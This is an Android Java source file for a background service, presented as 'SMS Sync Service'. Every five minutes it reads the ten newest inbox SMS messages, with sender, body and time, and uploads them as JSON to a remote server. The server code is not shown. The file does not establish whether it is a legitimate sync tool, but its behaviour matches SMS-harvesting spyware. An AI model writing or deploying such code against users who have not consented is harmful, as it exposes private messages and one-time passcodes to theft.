package com.example.sms;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.text.format.DateFormat;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.Timer;
import java.util.TimerTask;

public class SMSBackgroundService extends Service {
    private static final String CHANNEL_ID = "SMSServiceChannel";
    private SMSDatabaseHelper dbHelper;
    private Timer timer;
    private Handler handler;

    @Override
    public void onCreate() {
        super.onCreate();
        dbHelper = new SMSDatabaseHelper(this);
        handler = new Handler();
        startForegroundService();
        startSyncTask();
    }

    private void startForegroundService() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "SMS Sync Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("SMS Sync Service")
                .setContentText("Syncing SMS in the background")
                .setSmallIcon(R.drawable.ic_sms)
                .build();

        startForeground(1, notification);
    }

    private void startSyncTask() {
        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                handler.post(() -> readAndSendSMS());
            }
        }, 0, 5 * 60 * 1000); // Runs every 5 minutes
    }

    private void readAndSendSMS() {
        Uri uri = Uri.parse("content://sms/inbox");
        Cursor cursor = getContentResolver().query(uri, null, null, null, "date DESC LIMIT 10");

        if (cursor != null) {
            JSONArray smsArray = new JSONArray();

            while (cursor.moveToNext()) {
                String sender = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                String message = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                String timestamp = cursor.getString(cursor.getColumnIndexOrThrow("date"));
                String formattedTimestamp = DateFormat.format("yyyy-MM-dd HH:mm:ss", Long.parseLong(timestamp)).toString();
                String type = "received";

                JSONObject smsObject = new JSONObject();
                try {
                    smsObject.put("sender", sender);
                    smsObject.put("message", message);
                    smsObject.put("timestamp", formattedTimestamp);
                    smsObject.put("type", type);
                    smsArray.put(smsObject);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
            cursor.close();

            if (smsArray.length() > 0 && NetworkUtil.isOnline(this)) {
                new Thread(() -> {
                    SendSMSTask sendTask = new SendSMSTask(this);
                    if (sendTask.sendDataToServer(smsArray)) {
                        Log.d("SMS", "Messages sent successfully.");
                    } else {
                        Log.e("SMS", "Failed to send messages.");
                    }
                }).start();
            }
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (timer != null) {
            timer.cancel();
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
